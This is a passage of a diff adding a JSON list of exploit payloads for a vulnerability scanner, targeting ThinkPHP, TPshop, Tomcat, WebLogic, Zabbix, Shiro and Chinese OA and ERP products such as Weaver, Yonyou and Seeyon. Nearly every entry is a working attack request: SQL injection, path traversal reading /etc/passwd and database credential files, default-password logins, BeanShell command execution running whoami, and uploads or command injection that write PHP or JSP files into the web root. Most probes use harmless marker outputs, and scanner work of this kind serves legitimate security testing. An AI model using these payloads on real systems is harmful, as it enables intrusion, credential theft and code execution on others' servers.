+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": "_method=__construct&filter[]=printf&method=GET&server[REQUEST_METHOD]=TmlnaHQgZ2F0aGVycywgYW5%25%25kIG5vdyBteSB3YXRjaCBiZWdpbnMu&get[]=1"
+      },
+      "location": "body",
+      "keywords": "TmlnaHQgZ2F0aGVycywgYW5%kIG5vdyBteSB3YXRjaCBiZWdpbnMu1"
+    },
+    "tpshop-directory-traversal": {
+      "description": "tpshop-directory-traversal",
+      "payload": {
+        "method": "GET",
+        "uri": "/index.php/Home/uploadify/fileList?type=.+&path=../",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Accept-Encoding": "deflate"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "\"state\":\"SUCCESS\""
+    },
+    "tpshop-sqli": {
+      "description": "tpshop-sqli",
+      "payload": {
+        "method": "GET",
+        "uri": "/mobile/index/index2/id/1) and (select 1 from (select count(*),concat(0x716b627671,(select md5(12123)),0x716b627671,floor(rand(0)*2))x from information_schema.tables group by x)a)--",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "0acf03f408f90ea0dcba786d300620db"
+    },
+    "tomcat-cve-2017-12615-rce": {
+      "description": "tomcat-cve-2017-12615-rce",
+      "payload": {
+        "method": "GET",
+        "uri": "/jkstatus",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "JK Status Manager"
+    },
+    "weblogic-cve-2020-14750": {
+      "description": "weblogic-cve-2020-14750",
+      "payload": {
+        "method": "GET",
+        "uri": "/console/images/%252E./console.portal",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "/console/jsp/common/NoJMX.jsp"
+    },
+    "weblogic-ssrf": {
+      "description": "weblogic-ssrf",
+      "payload": {
+        "method": "GET",
+        "uri": "/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.1.1.1:700",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Cookie": "publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|;"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "&#39;127.1.1.1&#39;, port: &#39;700&#39;"
+    },
+    "zabbix-authentication-bypass": {
+      "description": "zabbix-authentication-bypass",
+      "payload": {
+        "method": "GET",
+        "uri": "/zabbix.php?action=dashboard.view&dashboardid=1",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "<a class=\"top-nav-zbbshare\" target=\"_blank\" title=\"Zabbix Share\" href=\"https://share.zabbix.com/\">Share</a>"
+    },
+    "zabbix-default-password": {
+      "description": "zabbix-default-password",
+      "payload": {
+        "method": "POST",
+        "uri": "/index.php",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "name=Admin&password=zabbix&autologin=1&enter=Sign+in"
+      },
+      "location": "body",
+      "keywords": "zbx_session"
+    },
+    "Zabbix SAML身份绕过漏洞": {
+      "description": "Zabbix SAML身份绕过漏洞 CVE-2022-23131",
+      "payload": {
+        "method": "GET",
+        "uri": "/index_sso.php",
+        "headers": {
+          "Connection": "close",
+          "Cache-Control": "max-age=0",
+          "Upgrade-Insecure-Requests": "1",
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept-Language": "zh-CN,zh;q=0.8",
+          "Cookie": "zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "action=dashboard.view"
+    },
+    "shiro检测": {
+      "description": "shiro检测",
+      "payload": {
+        "method": "GET",
+        "uri": "/",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Cookie": "rememberMe=1"
+        },
+        "body": ""
+      },
+      "location": "body",
       "keywords": "rememberMe=deleteMe"
+    },
+    "摄像头检测": {
+      "description": " 摄像头专项检测",
+      "payload": {
+        "method": "GET",
+        "uri": "/",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "doc/page/login."
+    },
+    "快捷通云视讯arbitrary-fileread": {
+      "description": "快捷通云视讯arbitrary-fileread",
+      "payload": {
+        "method": "POST",
+        "uri": "/fileDownload?action=downloadBackupFile",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "fullPath=/etc/passwd"
+      },
+      "location": "body",
+      "keywords": "root:"
+    },
+    "快捷通云视讯directory-file-leak.json": {
+      "description": "快捷通云视讯directory-file-leak.json",
+      "payload": {
+        "method": "GET",
+        "uri": "/him/api/rest/V1.0/system/log/list?filePath=../",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "\"absolutePath\":\"/var/logs/"
+    },
+    "泛微-filedownload-directory-traversal": {
+      "description": "泛微-filedownload-directory-traversal",
+      "payload": {
+        "method": "GET",
+        "uri": "/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "<url-pattern>/weaver/"
+    },
+    "泛微-javabeanshell-rce": {
+      "description": "泛微-javabeanshell-rce",
+      "payload": {
+        "method": "POST",
+        "uri": "/weaver/bsh.servlet.BshServlet",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "bsh.script=print%283333*3333%29&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw"
+      },
+      "location": "body",
+      "keywords": "11108889"
+    },
+    "泛微-springframework-directory-traversal": {
+      "description": "ecology-springframework-directory-traversal",
+      "payload": {
+        "method": "GET",
+        "uri": "/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "<url-pattern>/weaver/"
+    },
+    "泛微-syncuserinfo-sqli": {
+      "description": "泛微-syncuserinfo-sqli",
+      "payload": {
+        "method": "GET",
+        "uri": "/mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(3333*3333),null",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "11108889"
+    },
+    "泛微-v8-sqli": {
+      "description": "泛微-v8-sqli",
+      "payload": {
+        "method": "GET",
+        "uri": "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+3333*3333+as+id",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "11108889"
+    },
+    "泛微-v8-sqli copy": {
+      "description": "泛微-syncuserinfo-sqli",
+      "payload": {
+        "method": "POST",
+        "uri": "/cpt/manage/validate.jsp?sourcestring=validateNum",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "sourcestring=validateNum&capitalid=11%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion+select+str(3333*3333)&capitalnum=-10"
+      },
+      "location": "body",
+      "keywords": "11108889"
+    },
+    "泛微-协同办公OA任意管理员登录": {
+      "description": "泛微-协同办公OA任意管理员登录",
+      "payload": {
+        "method": "GET",
+        "uri": "/mobile/plugin/plus/login/LoingFromEb.jsp",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "window.location.href=\"/login/login.jsp"
+    },
+    "泛微OA V9 任意文件上传": {
+      "description": "泛微OA V9 任意文件上传",
+      "payload": {
+        "method": "POST",
+        "uri": "/page/exportImport/uploadOperation.jsp",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "renyizifumofamen"
+    },
+    "泛微_WorkflowCenterTreeData接口SQL注入": {
+      "description": "WorkflowCenterTreeData接口SQL注入",
+      "payload": {
+        "method": "POST",
+        "uri": "/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": "formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1"
+      },
+      "location": "body",
+      "keywords": "(PROTOCOL=TCP)"
+    },
+    "用友A8SQL注入": {
+      "description": "用友A8SQL注入",
+      "payload": {
+        "method": "GET",
+        "uri": "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "c4ca4238a0b923820dcc509a6f75849b"
+    },
+    "用友ERP-NC目录遍历漏洞": {
+      "description": "用友ERP-NC目录遍历漏洞",
+      "payload": {
+        "method": "GET",
+        "uri": "/NCFindWeb?service=IPreAlertConfigService&filename=",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "index.jsp"
+    },
+    "用友GRP-U8行政财务版SQL注入-RCE": {
+      "description": "用友GRP-U8行政财务版SQL注入-RCE",
+      "payload": {
+        "method": "POST",
+        "uri": "/Proxy",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format=\"text\">select @@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>"
+      },
+      "location": "body",
+      "keywords": "Microsoft SQL Server"
+    },
+    "用友NCarbitrary-file-upload": {
+      "description": "用友NCarbitrary-file-upload",
+      "payload": {
+        "method": "POST",
+        "uri": "/servlet/FileReceiveServlet",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "multipart/form-data;"
+        },
+        "body": "\\xac\\xed\\x00\\x05sr\\x00\\x11java.util.HashMap\\x05\\a\\xda\\xc1\\xc3\\x16`\\xd1\\x03\\x00\\x02F\\x00\nloadFactorI\\x00\tthresholdxp?@\\x00\\x00\\x00\\x00\\x00\fw\b\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x02t\\x00\tFILE_NAMEt\\x00\tchumengchumeng.jspt\\x00\\x10TARGET_FILE_PATHt\\x00\\x10./webapps/nc_webx<%out.print(\"chumeng12123\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>"
+      },
+      "location": "body",
+      "keywords": "renyizifumofamen"
+    },
+    "用友远程命令执行": {
+      "description": "用友远程命令执行",
+      "payload": {
+        "method": "POST",
+        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "bsh.script=exec%28%22whoami%22%29%3B%0D%0A"
+      },
+      "location": "body",
+      "keywords": "exec(\"whoami\")"
+    },
+    "禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取漏洞": {
+      "description": "禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取漏洞",
+      "payload": {
+        "method": "GET",
+        "uri": "/api-getModel-file-parseCSV-fileName=/etc/passwd",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:"
+    },
+    "netentsec-asg-file-read": {
+      "description": "网康 NS-ASG安全网关 任意文件读取漏洞",
+      "payload": {
+        "method": "GET",
+        "uri": "/admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "$certfile"
+    },
+    "netentsec-icg-default-password": {
+      "description": "netentsec-icg-default-password",
+      "payload": {
+        "method": "POST",
+        "uri": "/user/login/checkPermit",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "usrname=ns25000&pass=ns25000"
+      },
+      "location": "body",
+      "keywords": "\"agreed\":true"
+    },
+    "netentsec-ngfw-rce": {
+      "description": "netentsec-ngfw-rce",
+      "payload": {
+        "method": "POST",
+        "uri": "/directdata/direct/router",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "{\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt;echo '<?php echo md5(123);unlink(__FILE__);?>' >/var/www/html/chumeng.php\"]}],\"type\":\"rpc\",\"tid\":17}"
+      },
+      "location": "body",
+      "keywords": "SSLVPN_Resource"
+    },
+    "致远OA-ajax-unauthorized": {
+      "description": "致远OA-ajax-unauthorized",
+      "payload": {
+        "method": "GET",
+        "uri": "/seeyon/thirdpartyController.do.css/..;/ajax.do",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "java.lang.NullPointerException:null"
+    },
+    "致远OA-a6-employee-info-leak": {
+      "description": "致远OA-a6-employee-info-leak",
+      "payload": {
+        "method": "GET",
+        "uri": "/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "[Content_Types].xml"
+    },
+    "致远OA-cnvd-2020-62422-readfile": {
+      "description": "致远OA-cnvd-2020-62422-readfile",
+      "payload": {
+        "method": "GET",
+        "uri": "/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "ctpDataSource.password"
+    },
+    "致远OA-cookie-leak": {
+      "description": "致远OA-cookie-leak",
+      "payload": {
+        "method": "POST",
+        "uri": "/seeyon/thirdpartyController.do",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
+      },
+      "location": "body",
+      "keywords": "JSESSIONID="
+    },
+    "致远OA-session-leak": {
+      "description": "致远OA-session-leak",
+      "payload": {
+        "method": "GET",
+        "uri": "/yyoa/ext/https/getSessionList.jsp?cmd=getAll",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "<SessionList>\r\n<Session>\r\n<usrID>"
+    },
+    "致远OA-v8文件读取": {
+      "description": "致远OA-v8文件读取",
+      "payload": {
+        "method": "GET",
+        "uri": "/seeyon/main.do?method=officeDown&filename=c:/boot.ini",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "for 16-bit app support"
+    },
+    "通达oa-meeting-unauthorized-access": {
+      "description": "通达oa-meeting-unauthorized-access",
+      "payload": {
+        "method": "GET",
+        "uri": "/general/calendar/arrange/get_cal_list.php?starttime=1548058874&endtime=33165447106&view=agendaDay",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Accept-Encoding": "deflate"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "creator"
+    },
+    "金蝶OA-eas-directory-traversal-linux": {
+      "description": "金蝶OA-eas-directory-traversal",
+      "payload": {
+        "method": "GET",
+        "uri": "/appmonitor/protected/selector/server_file/files?folder=/&suffix=",
+        "headers": {
